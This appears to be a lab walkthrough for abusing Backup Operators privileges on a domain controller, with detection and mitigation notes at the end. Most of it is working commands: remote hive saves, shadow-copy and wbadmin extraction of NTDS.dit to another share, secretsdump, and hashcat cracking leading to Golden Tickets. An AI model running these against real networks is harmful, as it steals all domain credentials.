# Backup Operators — NTDS.dit Dump

## Overview

Members of the **Backup Operators** group have `SeBackupPrivilege` — the ability to read **any file** on the system regardless of ACLs. This is designed for backup software, but attackers abuse it to copy:

- `C:\Windows\NTDS\ntds.dit` — the Active Directory database (all hashes)
- `HKLM\SYSTEM` registry hive — required to decrypt ntds.dit
- `HKLM\SAM` — local account hashes

## Lab Account

| Account | Group | Password |
|---------|-------|----------|
| `dana.rashid` | Backup Operators | `p@ssw0rd` |

Set by `Setup-ExtraAttacks.ps1`:
```powershell
Add-ADGroupMember -Identity "Backup Operators" -Members "dana.rashid"
```

## Method A — Remote Registry via SMB (Impacket)

This is the easiest method — no interactive session needed.

```bash
# Authenticate as dana.rashid and dump via reg save remotely
reg.py corp.local/dana.rashid:p@ssw0rd@192.168.56.10 save HKLM\\SYSTEM C:\\loot\\system.hive
reg.py corp.local/dana.rashid:p@ssw0rd@192.168.56.10 save HKLM\\SAM C:\\loot\\sam.hive

# Copy ntds.dit via backup privilege
# (ntds.dit is locked, must use VSS or wbadmin)
```

## Method B — VSS Shadow Copy (Interactive on DC-01)

Backup Operators can create VSS snapshots.

```powershell
# On DC-01 as dana.rashid (RDP or WinRM)
# Step 1: Enable wbadmin feature
Install-WindowsFeature Windows-Server-Backup

# Step 2: Create a backup to a temp share
wbadmin start backup -backuptarget:\\192.168.56.30\share -include:C: -quiet

# Step 3: List available backups
wbadmin get versions

# Step 4: Restore ntds.dit from the backup
wbadmin start recovery -version:<TIMESTAMP> -itemtype:file -items:C:\Windows\NTDS\ntds.dit -recoverytarget:C:\loot -notrestoreacl -quiet
```

## Method C — diskshadow + robocopy

```cmd
# Create a diskshadow script
echo set context persistent nowriters > C:\loot\shadow.txt
echo add volume c: alias loot >> C:\loot\shadow.txt
echo create >> C:\loot\shadow.txt
echo expose %loot% z: >> C:\loot\shadow.txt
echo exit >> C:\loot\shadow.txt

diskshadow /s C:\loot\shadow.txt

# Now z: is a shadow copy of C:
robocopy z:\Windows\NTDS C:\loot ntds.dit /b
reg save HKLM\SYSTEM C:\loot\system.hive
```

The `/b` flag in robocopy uses backup semantics (SeBackupPrivilege).

## Method D — secretsdump Directly (Remote)

```bash
# If Backup Operators also have WinRM access (not by default, but if added to Remote Management Users)
secretsdump.py corp.local/dana.rashid:p@ssw0rd@192.168.56.10 \
  -just-dc-ntlm
```

## Step — Crack Hashes Offline

```bash
# After obtaining ntds.dit + system.hive on Linux
secretsdump.py -ntds ntds.dit -system system.hive LOCAL -outputfile hashes.txt

# Output format: username:rid:lmhash:nthash:::
# Example:
# Administrator:500:aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
# krbtgt:502:aad3b435b51404ee:deadbeefdeadbeef...:::

# Crack with hashcat
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

## Full Attack Chain

```
dana.rashid (Backup Operators)
  └─ SeBackupPrivilege on DC-01
      └─ Copy NTDS.dit + SYSTEM hive (VSS / wbadmin)
          └─ secretsdump LOCAL → all domain hashes
              └─ PTH / Golden Ticket → Full Domain Compromise
```

## Why It's Powerful

The NTDS.dit contains:
- NTLM hashes for **every domain account** (including DA and krbtgt)
- Kerberos keys (AES128/AES256)
- Historical password hashes

With the `krbtgt` hash you can forge **Golden Tickets** that last 10 years.

## Detection

| Indicator | Event ID |
|-----------|----------|
| VSS snapshot creation by non-admin | 8222 (VSS), 4656 |
| wbadmin / diskshadow execution | 4688 (process create) |
| Backup Operators member accessing DC files | 4663 (file access) |
| Unusual outbound SMB from DC | Network logs |

## Mitigations

- Do not add regular user accounts to Backup Operators
- Enable tiered administration — backup service accounts should not be regular user accounts
- Monitor DCs for VSS snapshot creation by non-SYSTEM accounts
- Enable Sysmon process creation logging
